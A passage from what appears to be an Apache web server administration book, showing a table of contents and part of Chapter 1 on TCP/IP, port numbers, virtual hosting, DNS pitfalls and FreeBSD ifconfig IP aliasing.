 
 

 
 
Copyright 
    
 
Preface 
       
 
Who Wrote Apache, and Why? 
       
 
The Demonstration Code 
       
 
Conventions Used in This Book  
       
 
Organization of This Book 
       
 
Acknowledgments 
    
    
 
Chapter 1.  Getting Started 
same network number and different host numbers, they should be able to fire up TCP/IP 
and send packets to each other down their local, physical network without any further 
ado.  
If the network numbers are not the same, the packets are sent to a router, a special 
machine able to find out where the other machine is and deliver the packets to it. This 
communication may be over the Internet or might occur on your wide area network 
(WAN). There are several ways computers use IP to communicate. These are two of 
them:  
UDP (User Datagram Protocol)  
A way to send a single packet from one machine to another. It does not guarantee 
delivery, and there is no acknowledgment of receipt. DNS uses UDP, as do other 
applications that manage their own datagrams. Apache doesn't use UDP.  
TCP (Transmission Control Protocol)  
A way to establish communications between two computers. It reliably delivers 
messages of any size in the order they are sent. This is a better protocol for our 
purposes.  
1.3.2 How Apache Uses TCP/IP 
Let's look at a server from the outside. We have a box in which there is a computer, 
software, and a connection to the outside world — Ethernet or a serial line to a modem, 
for example. This connection is known as an interface and is known to the world by its IP 
address. If the box had two interfaces, they would each have an IP address, and these 
addresses would normally be different. A single interface, on the other hand, may have 
more than one IP address (see Chapter 3).  
Requests arrive on an interface for a number of different services offered by the server 
using different protocols:  
• 
Network News Transfer Protocol (NNTP): news  
• 
Simple Mail Transfer Protocol (SMTP): mail  
• 
Domain Name Service (DNS)  

• 
HTTP: World Wide Web  
The server can decide how to handle these different requests because the four-byte IP 
address that leads the request to its interface is followed by a two-byte port number. 
Different services attach to different ports:  
• 
NNTP: port number 119  
• 
SMTP: port number 25  
• 
DNS: port number 53  
• 
HTTP: port number 80  
As the local administrator or webmaster, you can decide to attach any service to any port. 
Of course, if you decide to step outside convention, you need to make sure that your 
clients share your thinking. Our concern here is just with HTTP and Apache. Apache, by 
default, listens to port number 80 because it deals in HTTP business.  
 
Port numbers below 1024 can only be used by the superuser (root, under Unix); this 
prevents other users from running programs masquerading as standard services, but 
brings its own problems, as we shall see.  
 
Under Win32 there is currently no security directly related to port numbers and no 
superuser (at least, not as far as port numbers are concerned).  
This basic setup is fine if our machine is providing only one web server to the world. In 
real life, you may want to host several, many, dozens, or even hundreds of servers, which 
appear to the world as completely different from each other. This situation was not 
anticipated by the authors of HTTP 1.0, so handling a number of hosts on one machine 
has to be done by a kludge, assigning multiple addresses to the same interface and 
distinguishing the virtual host by its IP address. This technique is known as IP-intensive 
virtual hosting. Using HTTP 1.1, virtual hosts may be created by assigning multiple 
names to the same IP address. The browser sends a Host header to say which name it is 
using.  
1.3.3 Apache and Domain Name Servers 
In one way the Web is like the telephone system: each site has a number that uniquely 
identifies it — for instance, 192.168.123.5. In another way it is not: since these numbers 
are hard to remember, they are automatically linked to domain names — 
www.amazon.com, for instance, or www.butterthlies.com, which we shall meet later in 
examples in this book.  

When you surf to http://www.amazon.com, your browser actually goes first to a specialist 
server called a Domain Name Server (DNS), which knows (how it knows doesn't concern 
us here) that this name translates into 208.202.218.15.It then asks the Web to connect it 
to that IP number. When you get an error message saying something like "DNS not 
found," it means that this process has broken down. Maybe you typed the URL 
incorrectly, or the server is down, or the person who set it up made a mistake — perhaps 
because he didn't read this book.  
A DNS error impacts Apache in various ways, but one that often catches the beginner is 
this: if Apache is presented with a URL that corresponds to a directory, but does not have 
a / at the end of it, then Apache will send a redirect to the same URL with the trailing / 
added. In order to do this, Apache needs to know its own hostname, which it will attempt 
to determine from DNS (unless it has been configured with the ServerName directive, 
covered in Chapter 2. Often when beginners are experimenting with Apache, their DNS 
is incorrectly set up, and great confusion can result. Watch out for it! Usually what will 
happen is that you will type in a URL to a browser with a name you are sure is correct, 
yet the browser will give you a DNS error, saying something like "Cannot find server." 
Usually, it is the name in the redirect that causes the problem. If adding a / to the end of 
your URL causes it, then you can be pretty sure that's what has happened.  
1.3.3.1 Multiple sites: Unix 
It is fortunate that the crucial Unix utility ifconfig, which binds IP addresses to physical 
interfaces, often allows the binding of multiple IP numbers to a single interface so that 
people can switch from one IP number to another and maintain service during the 
transition. This is known as "IP aliasing" and can be used to maintain multiple "virtual" 
web servers on a single machine.  
In practical terms, on many versions of Unix, we run ifconfig to give multiple IP 
addresses to the same interface. The interface in this context is actually the bit of software 
— the driver — that handles the physical connection (Ethernet card, serial port, etc.) to 
the outside. While writing this book, we accessed the practice sites through an Ethernet 
connection between a Windows 95 machine (the client) and a FreeBSD box (the server) 
running Apache.  
Our environment was very untypical, since the whole thing sat on a desktop with no 
access to the Web. The FreeBSD box was set up using ifconfig in a script lan_setup, 
which contained the following lines:  
ifconfig ep0 192.168.123.2 
ifconfig ep0 192.168.123.3 alias netmask 0xFFFFFFFF 
ifconfig ep0 192.168.124.1 alias 
The first line binds the IP address 192.168.123.2 to the physical interface ep0. The 
second binds an alias of 192.168.123.3 to the same interface. We used a subnet mask 
(netmask 0xFFFFFFFF) to suppress a tedious error message generated by the FreeBSD 
TCP/IP stack. This address was used to demonstrate virtual hosts. We also bound yet 

another IP address, 192.168.124.1, to the same interface, simulating a remote server to 
demonstrate Apache's proxy server. The important feature to note here is that the address 
192.168.124.1 is on a different IP network from the address 192.168.123.2, even though 
it shares the same physical network. No subnet mask was needed in this case, as the error 
message it suppressed arose from the fact that 192.168.123.2 and 192.168.123.3 are on 
the same network.  
Unfortunately, each Unix implementation tends to do this slightly differently, so these 
commands may not work on your system. Check your manuals!  
In real life, we do not have much to do with IP addresses. Web sites (and Internet hosts 
